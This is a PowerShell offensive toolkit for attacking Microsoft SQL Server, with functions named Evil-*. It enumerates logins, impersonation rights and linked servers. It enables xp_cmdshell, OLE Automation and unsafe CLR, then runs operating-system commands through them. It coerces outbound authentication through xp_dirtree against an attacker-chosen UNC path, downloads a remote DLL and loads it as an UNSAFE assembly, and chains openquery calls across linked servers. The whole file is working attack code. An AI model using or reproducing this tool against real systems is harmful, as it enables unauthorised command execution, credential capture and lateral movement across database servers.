Function Evil-SQLConnect()
{
    Param(
        [Parameter()]
        [string]$Server,
 
        [Parameter()]
        [string]$Database,

        [Parameter()]
        [string]$Username,

        [Parameter()]
        [string]$Password   
    )
    
    if($Server -eq ""){
        Write-Output "Usage: "
        Write-Output "Evil-SQLConnect <Server> <Database> <Username> <Password>";
        Write-Output "Evil-SQLConnect sql01.example.com";
        Write-Output "Evil-SQLConnect sql01.example.com master";
        Write-Output "Evil-SQLConnect sql01.example.com master pwn P@ssw0rd";
        Write-Output "";
        return
    }
    if($Database -eq ""){
        $Database = "master"
    }

    $global:EvilSQLConnection = New-Object -TypeName System.Data.SqlClient.SqlConnection
    if(($Username -ne "") -And ($Password -ne "")){
        $global:EvilSQLConnection.ConnectionString = "Server = $Server; Database = $Database; User ID = $Username; Password = $Password;"
    }else{
        $global:EvilSQLConnection.ConnectionString = "Server = $Server; Database = $Database; Integrated Security = True"
    }

    try{
        $global:EvilSQLConnection.Open()
        Write-Output "[+] Auth success!"
        $server = $global:EvilSQLConnection.DataSource
        $database = $global:EvilSQLConnection.Database
        $state = $global:EvilSQLConnection.State
        Write-Output "[I] Server: $server"
        Write-Output "[I] Database: $database"
        Write-Output "[I] Connection: $state"
    }catch{
        Write-Output "[-] Auth failed"
    }
}
Function Evil-SQLClose()
{
    try{
        $global:EvilSQLConnection.Close()
        $global:EvilSQLConnection.Dispose()
        Write-Output "[I] Bye!"
    }catch{
        Write-Output "[E] $($_.Exception.Message)"
        throw $_
    }
}


Function Run-SQLQuery()
{
    Param(
        $Query
    )

    if($Query -eq $null){
        Write-Output "Usage: "
        Write-Output "Run-SQLQuery 'SELECT @@version'";
        Write-Output "";
        return
    }

    try{
        $SQLCommand = New-Object System.Data.SqlClient.SqlCommand
        $SQLCommand.Connection = $global:EvilSQLConnection 
        $SQLCommand.CommandText = $Query
                        
        $reader = $SQLCommand.ExecuteReader()
        $recordsetArray = @()
        while ($reader.Read()){
            $recordsetArray += $reader[0]              
        }
    }catch{
        Write-Output "[E] $($_.Exception.Message)"
        throw $_
    }
    $reader.Close()
    return $recordsetArray
}

Function Run-CustomQuery()
{
    Param(
        [Parameter()]
        [string]$Query,
 
        [Parameter()]
        [string]$Server,

        [Parameter()]
        $LinkedServers=@()
    )

    if($Query -eq ""){
        Write-Output "Usage: "
        Write-Output "Run-CustomQuery -Query 'SELECT @@version'";
        Write-Output "Run-CustomQuery -Query 'SELECT @@version' -Server SQL01";
        Write-Output "";
        return
    }

    if($Server -ne ""){
        Write-Output "[I] Executing Query on :$Server"
        $cmd = New-Object system.Data.SqlClient.SqlCommand("Select * from openquery(""$Server"",'$Query')",$EvilSQLConnection)
    }elseif($LinkedServers.Count -ge 2){
        $Query = Invoke-EvilLinkedServerQuery -LinkedServers $LinkedServers -SQL $Query
        Write-Output $Query
        $cmd = New-Object system.Data.SqlClient.SqlCommand($Query,$EvilSQLConnection)
    }else{
        $cmd = New-Object system.Data.SqlClient.SqlCommand($Query,$EvilSQLConnection)
    }
    $ds = New-Object system.Data.DataSet
    $da = New-Object system.Data.SqlClient.SqlDataAdapter($cmd)
	[void]$da.fill($ds)
    Write-Output "[I] Result of query:"
    $ds.Tables
}

Function Get-CurrentContext()
{
    Param(
        [Parameter()]
        [string]$Server,

        [Parameter()]
        $LinkedServers=@()
    )
        
    if($Server -ne "")
    {
        Write-Output "[I] Executing Query on :$Server"
        $Records = Run-SQLQuery "Select * from openquery(""$Server"",'SELECT SYSTEM_USER')"
        $Records2 = Run-SQLQuery "Select * from openquery(""$Server"",'SELECT USER_NAME()')"
    }elseif($LinkedServers.Count -ne 0){
        $Query = Invoke-EvilLinkedServerQuery -LinkedServers $LinkedServers -SQL "SELECT SYSTEM_USER"
        $Records = Run-SQLQuery $Query
        $Query = Invoke-EvilLinkedServerQuery -LinkedServers $LinkedServers -SQL "SELECT USER_NAME()"
        $Records2 = Run-SQLQuery  $Query
    }else{
        $Records = Run-SQLQuery "SELECT SYSTEM_USER"
        $Records2 = Run-SQLQuery "SELECT USER_NAME()"
    }

    foreach ($item in $Records) {
	    Write-Output "[+] Current Login Username: $item"
    }
    foreach ($item in $Records2) {
	    Write-Output "[+] Executing in the context of: $item"
    }
}
Function Get-SQLUsers()
{
    Param(
        [Parameter()]
        [string]$Server,

        [Parameter()]
        $LinkedServers=@()
    )
        
    if($Server -ne ""){
        Write-Output "[I] Executing Query on :$Server"
        $Records = Run-CustomQuery "Select * from openquery(""$Server"",'SELECT members.Name, roles.name AS Role, members.type_desc as LoginType FROM sys.server_role_members AS server_role_members INNER JOIN sys.server_principals AS roles ON server_role_members.role_principal_id = roles.principal_id INNER JOIN sys.server_principals AS members ON server_role_members.member_principal_id = members.principal_id')"
    }elseif($LinkedServers -ne 0){
        $Records = Run-CustomQuery -LinkedServers $LinkedServers "SELECT members.Name, roles.name AS Role, members.type_desc as LoginType FROM sys.server_role_members AS server_role_members INNER JOIN sys.server_principals AS roles ON server_role_members.role_principal_id = roles.principal_id INNER JOIN sys.server_principals AS members ON server_role_members.member_principal_id = members.principal_id"
    }else{
        $Records = Run-CustomQuery "SELECT members.Name, roles.name AS Role, members.type_desc as LoginType FROM sys.server_role_members AS server_role_members INNER JOIN sys.server_principals AS roles ON server_role_members.role_principal_id = roles.principal_id INNER JOIN sys.server_principals AS members ON server_role_members.member_principal_id = members.principal_id"
    }
    $Records
}
Function Get-ImpersonationLogins()
{
    $Records = Run-SQLQuery "SELECT distinct b.name FROM sys.server_permissions a INNER JOIN sys.server_principals b ON a.grantor_principal_id = b.principal_id WHERE a.permission_name = 'IMPERSONATE'"
    foreach ($item in $Records) {
	    Write-Output "[+] Logins that can be impersonated: $item"
    } 
}
Function Get-ImpersonationLoginsEx()
{
    Param(
        [Parameter()]
        [string]$Server,

        [Parameter()]
        $LinkedServers=@()
    )
    if($Server -ne ""){
        Write-Output "[I] Executing Query on :$Server"
        $Records = Run-CustomQuery -Query "SELECT gp.name AS GrantImpersonateUser , gp.type_desc AS UserType , sp.name AS ImpersonatedUser , sp.type_desc AS ImpersonatedUserType From sys.server_permissions AS sperm INNER JOIN sys.server_principals AS sp ON sp.principal_id = sperm.major_id AND sperm.class = 101 INNER JOIN sys.server_principals AS gp ON gp.principal_id = sperm.grantee_principal_id WHERE sperm.state = 'G'" -Server $Server
    }elseif($LinkedServers -ne 0){
        $Server=$LinkedServers[$LinkedServers.Count-1]
        Write-Output "[I] Executing Query on :$Server"
        $Records = Run-CustomQuery -LinkedServers $LinkedServers -Query "SELECT gp.name AS GrantImpersonateUser , gp.type_desc AS UserType , sp.name AS ImpersonatedUser , sp.type_desc AS ImpersonatedUserType From sys.server_permissions AS sperm INNER JOIN sys.server_principals AS sp ON sp.principal_id = sperm.major_id AND sperm.class = 101 INNER JOIN sys.server_principals AS gp ON gp.principal_id = sperm.grantee_principal_id WHERE sperm.state = 'G'"
    }else{
        $Records =  Run-CustomQuery "SELECT gp.name AS GrantImpersonateUser , gp.type_desc AS UserType , sp.name AS ImpersonatedUser , sp.type_desc AS ImpersonatedUserType From sys.server_permissions AS sperm INNER JOIN sys.server_principals AS sp ON sp.principal_id = sperm.major_id AND sperm.class = 101 INNER JOIN sys.server_principals AS gp ON gp.principal_id = sperm.grantee_principal_id WHERE sperm.state = 'G'"
    }
    $Records
}
Function Get-LinkedServers()
{
    Param(
        [Parameter()]
        [string]$Server
    )
        
    if($Server -ne ""){
        Write-Output "[I] Executing Query on :$Server"
        $Records = Run-SQLQuery "EXEC ('sp_linkedservers') AT $Server"
    }else{
        $Records =  Run-SQLQuery "EXEC sp_linkedservers;"
    }foreach ($item in $Records) {
	    Write-Output "[+] Find Linked SQL Server: $item"
    }
}
Function Get-LinkedServersEx()
{
    Param(
        [Parameter()]
        [string]$Server,

        [Parameter()]
        $LinkedServers=@()
    )
        
    if($Server -ne ""){
        Write-Output "[I] Executing Query on :$Server"
        $Records = Run-CustomQuery -Query "SELECT s.Name as ServerName, s.is_linked as Linked, s.is_remote_login_enabled as Remote_Login_Enabled, s.is_rpc_out_enabled as RPC_Enabled, sp.Name, ll.Remote_Name FROM sys.Servers s LEFT OUTER JOIN sys.linked_logins ll ON ll.server_id = s.server_id LEFT OUTER JOIN sys.server_principals sp ON sp.principal_id = ll.local_principal_id" -Server $Server
    }elseif($LinkedServers -ne 0){
        $Server=$LinkedServers[$LinkedServers.Count-1]
        Write-Output "[I] Executing Query on :$Server"
        $Records = Run-CustomQuery -LinkedServers $LinkedServers -Query "SELECT s.Name as ServerName, s.is_linked as Linked, s.is_remote_login_enabled as Remote_Login_Enabled, s.is_rpc_out_enabled as RPC_Enabled, sp.Name, ll.Remote_Name FROM sys.Servers s LEFT OUTER JOIN sys.linked_logins ll ON ll.server_id = s.server_id LEFT OUTER JOIN sys.server_principals sp ON sp.principal_id = ll.local_principal_id"
    }else{
        $Records =  Run-CustomQuery "SELECT s.Name as ServerName, s.is_linked as Linked, s.is_remote_login_enabled as Remote_Login_Enabled, s.is_rpc_out_enabled as RPC_Enabled, sp.Name, ll.Remote_Name FROM sys.Servers s LEFT OUTER JOIN sys.linked_logins ll ON ll.server_id = s.server_id LEFT OUTER JOIN sys.server_principals sp ON sp.principal_id = ll.local_principal_id"
    }
    $Records
}

Function Enable-XPCmd()
{
    Param(
        [Parameter()]
        [string]$Server
    )

    if($Server -ne ""){
        Write-Output "[I] Executing Query on :$Server"
        Run-SQLQuery "EXEC ('sp_configure ''show advanced options'', 1; reconfigure;') AT ""$Server"""
        Run-SQLQuery "EXEC ('sp_configure ''xp_cmdshell'', 1; reconfigure;') AT ""$Server"""
    }
    Run-SQLQuery "EXEC sp_configure 'show advanced options', 1;RECONFIGURE; EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE;"
}
Function Enable-Ole()
{
    Param(
        [Parameter()]
        [string]$Server
    )

    if($Server -ne ""){
        Write-Output "[I] Executing Query on :$Server"
        $Records = Run-SQLQuery "EXEC ('sp_configure ''Ole Automation Procedures'', 1; RECONFIGURE;') AT ""$Server"""
    }
    Run-SQLQuery "EXEC sp_configure 'Ole Automation Procedures', 1; RECONFIGURE;"
}
Function Enable-Assembly()
{
    Param(
        [Parameter()]
        [string]$Database
    )

    if($Database -eq ""){
        $Database = "msdb"
    }
    Run-SQLQuery "use $Database;EXEC sp_configure 'show advanced options',1; RECONFIGURE;"
    Run-SQLQuery "use $Database;EXEC sp_configure 'clr enabled',1; RECONFIGURE;"
    Run-SQLQuery "use $Database;EXEC sp_configure 'clr strict security', 0; RECONFIGURE;"
}

Function Invoke-EvilImpersonationLogin()
{
    Param(
        [Parameter()]
        [string]$Username,
        
        [Parameter()]
        [string]$Server
    )
    Run-SQLQuery "EXECUTE AS LOGIN = '$Username';"
}

Function Invoke-EvilXpCmd()
{
    Param(
        [Parameter()]
        [string]$Command,
        
        [Parameter()]
        [string]$Server,

        [Parameter()]
        $LinkedServers=@()
    )

    if($Server -ne ""){
        Write-Output "[I] Executing Query on :$Server"
        $Records = Run-SQLQuery "EXEC ('xp_cmdshell ''$Command'' ') AT $Server"
    }elseif($LinkedServers -ne 0){
        $Server=$LinkedServers[$LinkedServers.Count-1]
        Write-Output "[I] Executing Query on :$Server"
        $Query = Invoke-EvilLinkedServerQuery  -LinkedServers $LinkedServers -SQL "EXEC xp_cmdshell $Command"
        $Records = Run-SQLQuery -Query $Query
    }else{
        $Records =  Run-SQLQuery "EXEC master..xp_cmdshell $Command"
    }
    Write-Output "[I] Result of command:"
	foreach ($item in $Records) {
		Write-Output " $item"
	}  
}
Function Invoke-EvilOACreate()
{
    Param(
        [Parameter()]
        [string]$Command
    )

    Run-SQLQuery "DECLARE @myshell INT; EXEC sp_oacreate 'wscript.shell', @myshell OUTPUT; EXEC sp_oamethod @myshell, 'run', null, 'cmd /c $Command"
}
Function Invoke-EvilUNCPath()
{
    Param(
        [Parameter()]
        [string]$Address,
        
        [Parameter()]
        [string]$Server
    )

    if($Server -ne ""){
        Write-Output "[I] Executing Query on :$Server"
        Run-SQLQuery "EXEC ('xp_dirtree ''\\$Address\file''') AT $Server"
    }
    Run-SQLQuery "xp_dirtree '\\$Address\file'"
}
Function Invoke-EvilLoadDll()
{
    Param(
        [Parameter()]
        [string]$Database,
        
        [Parameter()]
        [string]$File
    )

    if($Database -eq ""){
        $Database = "msdb"
    }
    Write-Output "[I] Load DLL From $File"
    $stringBuilder = New-Object -Type System.Text.StringBuilder 

    $fileStream = [IO.File]::OpenRead($File)
    while (($byte = $fileStream.ReadByte()) -gt -1) {
        $stringBuilder.Append($byte.ToString("X2")) | Out-Null
    }
    $assembly = $stringBuilder.ToString() -join ""

    Run-SQLQuery "use $Database;CREATE ASSEMBLY myAssembly FROM 0x$assembly WITH PERMISSION_SET = UNSAFE;"
}
Function Invoke-EvilLoadRemoteDll()
{
        Param(
        [Parameter()]
        [string]$Database,
        
        [Parameter()]
        [string]$Url
    )

    if($Database -eq ""){
        $Database = "msdb"
    }
    Write-Host "[I]Load DLL From $Url"
    $wc = New-Object System.Net.WebClient 
    $bytes = $wc.DownloadData($Url)
    $assembly = ($bytes|ForEach-Object ToString X2) -join ''
        
    Run-SQLQuery "use $Database;CREATE ASSEMBLY myAssembly FROM 0x$assembly WITH PERMISSION_SET = UNSAFE;"
}

Function Invoke-EvilLinkedServerQuery
{
    Param(
        [Parameter()]
        $LinkedServers=@(),

        [Parameter()]
        [string]$SQL
    )

    $Query = "select * from openquery("
    $Count = 1

    for($i = 0; $i -lt $LinkedServers.Count; $i++){
        if ($i -eq 0){
            continue
        }elseif ($i -eq 1 -and $i+1 -ne $LinkedServers.Count){
            $Server = $LinkedServers[$i] 
            $Query +=  """$Server"",'select * from openquery("
        }elseif ($i+1 -ne $LinkedServers.Count) {
            $Server = $LinkedServers[$i] 
            $Query +=  """$Server""," +  "'" * [math]::pow(2,$Count) + "select * from openquery("
            $Count++
        }else{
            $Server = $LinkedServers[$i] 
            if ($i -eq 1){
                $SQL = $SQL.replace("'","'" * 2)
                $Query +=  """$Server"",'$SQL')"
            }else{
                $SQL = $SQL.replace("'","'" * [math]::pow(2,$Count+1))
                $Query += """$Server""," + "'" * [math]::pow(2,$Count) + "$SQL"
                while($Count -ne 0){
                    $Query += "'" * [math]::pow(2,$Count) + ")"
                    $Count--
                }
                $Query += "')"
            }
        }
    }
    return $Query
}
